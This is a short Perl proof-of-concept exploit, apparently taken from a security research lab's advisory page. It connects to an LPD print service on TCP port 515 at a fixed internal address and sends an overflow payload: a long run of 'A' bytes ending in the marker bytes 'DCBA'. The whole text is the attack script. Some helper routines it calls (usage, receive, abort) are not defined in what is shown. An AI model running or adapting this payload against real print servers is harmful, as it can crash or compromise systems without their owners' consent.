 
## Source:
## http://www.protekresearchlab.com/index.php?option=com_content&view=article&id=21&Itemid=21
 
use Getopt::Std;
use IO::Socket::INET;
 
$SIG{INT}  = \&abort;
 
my $host  = &#039;10.102.3.79&#039;;
my $port  = 515;
my $proto = &#039;tcp&#039;;
my $sockType = SOCK_STREAM;
my $timeout = 1;
 
 
my %opt;
my $opt_string = &#039;hH:P:t:&#039;;
getopts( "$opt_string", \%opt );
 
if (defined $opt{h}) {
    usage()
}
 
my @commands = (
{Command => &#039;Send&#039;,
 Data => "\x01\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x44\x43\x42\x41\x0a"},
 
);
 
my $sock = new IO::Socket::INET (  
                PeerAddr => $host,
                        PeerPort => $port,
                        Proto => $proto,
                Type => $sockType,
                Timeout => $timeout,
            )
    or die "socket error: $!\n\n";
 
print "connected to: $host:$port\n";
 
$sock->autoflush(1);
binmode $sock;
 
 
foreach my $command (@commands)
{
    if ($command->{&#039;Command&#039;} eq &#039;Receive&#039;)
    {
        my $buf = receive($sock, $timeout);
        if (length $buf)
        {
            print "received: [$buf]\n";
        }
    }
    elsif ($command->{&#039;Command&#039;} eq &#039;Send&#039;)
    {
        print "sending: [".$command->{&#039;Data&#039;}."]\n";
        send ($sock, $command->{&#039;Data&#039;}, 0) or die "send failed, reason: $!\n";
    }
}
 
 
close ($sock);



